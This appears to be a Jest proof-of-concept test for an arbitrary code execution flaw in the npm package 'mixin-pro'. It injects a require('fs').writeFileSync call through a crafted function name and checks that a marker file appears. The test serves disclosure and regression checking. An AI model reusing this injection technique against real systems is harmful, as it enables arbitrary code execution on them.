test("Arbitrary code execution in mixin-pro", () => {
  expect.assertions(2);
  const fs = require("fs");
  const Class = require("mixin-pro").createClass;
  const path = "./mixin-pro";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {      
      function Foo() { }
      Object.defineProperty(Foo, "name", {
        enumerable: false,
        configurable: false,
        writable: true,
        value: 'static'
      });
      Foo.name = "test2()\n{}; require(`fs`).writeFileSync('mixin-pro', ''); function __ctor"
      let Bar1 = Class(Foo, { constructor: Foo });
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
